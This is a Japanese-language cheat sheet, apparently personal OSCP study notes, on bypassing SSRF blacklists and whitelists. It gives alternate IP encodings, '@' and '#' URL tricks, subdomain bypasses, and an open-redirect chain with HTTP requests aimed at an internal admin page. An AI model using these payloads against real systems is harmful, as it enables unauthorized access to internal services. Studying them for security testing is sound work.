## SSRF ブラックリスト回避

- 以下の手段を個別に、または、併用する

###### IPアドレスの代替表記

- `127.0.0.1` = 
	- `2130706433`
	- `017700000001`
	- `127.1`
	- `spoofed.burpcollaborator.net` (BurpのProのみlocalhostに名前解決される)

###### 難読化

- [Web攻撃の難読化](../../../OSCP/Cheatsheet/Evasion(範囲外)/Web攻撃の難読化.md)

###### 異なるプロトコルやスキームを使用

- 例: `http:`  ->  `https:` 

###### 攻撃者が制御できるURLで、ターゲットURLへリダイレクトするものを入力する❓

-   リダイレクトには様々なredirect code([Mozilla参照](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections))を試す。

## SSRF ホワイトリスト回避

- 以下の手段を個別に、または、併用する

###### 以下の説明の前提

- ホワイトリストで許可されている文字列: `expected-host`
- 攻撃者がアクセスしたいホスト: `evil-host`

###### 前方一致のバイパス

- ホスト名の前にクレデンシャルを注入できる機能を使う。`@`を使用
```
https://evil-host:fakepassword@expected-host
```
	or
```
https://expected-host:fakepassword@evil-host
```

###### 後方一致のバイパス

- フラグメントの機能。`#`を使用。
```
https://evil-host#expected-host
```

###### 前方・後方のバイパス

- サブドメインを使用してフィルタをバイパスしつつ、攻撃者が制御するFQDNに変換
- 前方一致のバイパス：　
```
https://expected-host.evil-host
```

- 後方一致のバイパス：　正規のドメインのサブドメインを侵害しておく必要がある
```
https://pwned-host.expected-host
```

###### 難読化

- 単一もしくは二重のURLエンコード
	- URL解析のアプリケーションコードを混乱させる

###### 🚨

- ブラックリストのバイパスと異なり、スキーマやプロトコルを変更しないこと
- フィルタが何種類あるか考える。==複数種類のフィルタが存在すると考える==

## Open redirectによるSSRFフィルタのバイパス

- ブラックリスト・ホワイトリストによる検証が回避できない場合

#### バイパスできる条件

- `redirect=`、 `path=`、`goto＝`パラメタ等でリダイレクトしている
- 上記のパラメタにGoogle(`https://google.com`)を指定して正常にリダイレクトされる

### Open redirectによるSSRFフィルタのバイパス実践ステップ

- 目的：プライベートIPアドレスである`http://192.168.0.1/admin`にアクセスすること
- **重要**：localhostやプライベートIPアドレスはPOSTメソッドのほうがアクセスできる可能性が高い

1. Webアプリ内でアプリケーションに影響するリダイレクトを見つける
	- `redirect=`、 `path=`、`goto＝`、`url=`等
	- `HTTP/2 302 Found`など、300系のStatus

2. Open redirectの脆弱性が存在するか確かめる。
```HTTP
GET ?currentProductId=5&path=/product?productId=6
```
	↓
```http
GET ?currentProductId=5&path=https://google.com
```
- Repeaterの"Follow redirection"でGoogleのページが表示されたら脆弱性がある

3. "POST"でリクエストしているボディ部にアクセス先のURL(`http://192.168.0.1/admin`)を入力
```HTTP
POST /product/stock HTTP/2
...
stockApi=/product/stock/check?productId=2&storeId=1
```
	↓
```http
stockApi=/product/nextProduct?currentProductId=5&path=http://192.168.0.1/admin
```
